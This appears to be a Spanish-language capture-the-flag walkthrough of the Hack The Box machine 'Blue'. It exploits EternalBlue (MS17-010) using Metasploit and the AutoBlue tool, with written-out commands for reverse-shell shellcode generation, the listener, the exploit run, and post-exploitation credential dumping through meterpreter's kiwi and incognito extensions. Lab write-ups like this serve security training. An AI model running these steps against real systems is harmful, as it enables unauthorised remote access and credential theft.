# 3 - Blue \(win\_easy\)

```text
nmap -T4 -p- -A -sS 10.10.10.40
```

La gracia de este es explotar **ETERNAL BLUE** super famoso y permitie ejecutar codigo y ganar acceso en computadoras remotas.

![](../../.gitbook/assets/imagen%20%28511%29.png)

Cuando vemos esas versiones de windows 7 suena nuestra alarma hacker y decimos ETERNAL BLUE.

Primero checkeamos si esta para darle al eternal blue, no queremos dispararlo sin estar seguro de que existe en la maquina.

![](../../.gitbook/assets/imagen%20%28503%29.png)

![](../../.gitbook/assets/imagen%20%28512%29.png)

![Funciona a la primera](../../.gitbook/assets/imagen%20%28505%29.png)

Esta bien pero podemos mejorar la reverse shell

![](../../.gitbook/assets/imagen%20%28513%29.png)

Probemos con reverse tcp. 

## We are in

![](../../.gitbook/assets/imagen%20%28504%29.png)

Tiramos algunos para estudiar la red

```text
route print
arp -a
netstat -ano
```

### Usando kiwi

```text
meterpreter > load
(tira lista de extensiones)

meterpreter > load kiwi
```

![](../../.gitbook/assets/imagen%20%28508%29.png)

Otra extension muy buena es **incognito**.

![](../../.gitbook/assets/imagen%20%28509%29.png)

## Autoblue

{% embed url="https://github.com/3ndG4me/AutoBlue-MS17-010" %}

```text
 run python eternal_checker.py <TARGET-IP>
```

![](../../.gitbook/assets/imagen%20%28514%29.png)

```text
./shell_prep.sh
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
<YOUR-IP>
LPORT you want x64 to listen on:
<SOME PORT>
LPORT you want x86 to listen on:
<SOME OTHER PORT>
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
0
```

![](../../.gitbook/assets/imagen%20%28506%29.png)

```text
 /,-
  ||)
  \\_, )
   `--'
Enternal Blue Metasploit Listener

LHOST for reverse connection:
<YOUR-IP>
LPORT for x64 reverse connection:
<SOME PORT>
LPORT for x86 reverse connection:
<SOME OTHER PORT>
Enter 0 for meterpreter shell or 1 for regular cmd shell:
0
Starting listener...
```

```text
python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin> <Number of Groom Connections (optional)>
```

![](../../.gitbook/assets/imagen%20%28510%29.png)

Luego ganamos acceso.

